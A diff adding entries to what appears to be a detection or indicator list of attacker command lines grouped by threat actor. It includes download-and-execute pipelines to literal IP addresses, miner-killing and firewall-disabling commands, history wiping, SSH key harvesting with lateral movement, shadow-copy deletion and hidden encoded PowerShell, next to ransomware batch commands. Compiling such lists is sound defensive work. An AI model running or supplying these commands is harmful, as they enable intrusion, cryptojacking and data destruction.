@@ -65,5 +65,55 @@ for /f "delims=" %%i in (host.txt) do ( start psexec.exe -accepteula \\%%i -s C:
 start "C:\'Program Files'\dcrypt\dccon.exe" -encrypt Z:\ -p
 for /f "delims=" %%i (host.txt) do ( start psexec.exe -accepteula \\%%i -s shutdown -r -f -t 30 ping 127.0.0.1 -n 1 )
 
+# Money Libra
+/bin/bash -c apt-get update && apt-get install -y wget cron; service cron start; wget -q -O - http://78.153.140.96/mi.sh | sh; tail -f /dev/null
+chattr -i /etc/ld.so.preload
+rm -f /etc/ld.so.preload
+pkill -f supportxml
+pkill -f monero
+pkill -f kthreaddi
+pkill -f srv00
+pkill -f /tmp/.javae/javae
+pkill -f .javae
+pkill -f .syna
+pkill -f .main
+pkill -f xmm
+
+ufw disable
+iptables -F
+
+history -c
+rm -rf .bash_history
+cat .bash_history
+
+.ssh
+id_rsa
+id_dsa
+id_ecdsa
+id_ecdsa-sk
+id_ed25519
+id_ed25519-sk
+id_rsa
+known_hosts
+
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp
+sudo curl -L http://194.38.20.199/spr.sh
+sudo wget -q -O - http://194.38.20.199/spr.sh
+
+sh -c '[ -f "/bin/bash" ] && (curl -s http://78.153.140.96/ph.sh||wget -q -O- http://78.153.140.96/ph.sh)|bash || (curl -s http://78.153.140.96/ph2.sh||wget -q -O- http://78.153.140.96/ph2.sh)|sh'
+
+# Hive0117
+wscript.exe "%AppData%\Local
+wscript.exe "%AppData\Roaming
+cscript.exe "%AppData%\Local
+cscript.exe "%AppData%\Roaming
+
+regsrv32.exe /i /s "C:\Users
+
+vssadmin.exe Delete Shadows /All /Quiet
+pwsh.exe -NonI -W Hidden -Exec Bypass
+Add-MpPreference -ExclusionPath %LOCALAPPDATA%
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc
+
 # Do not remove the line
 
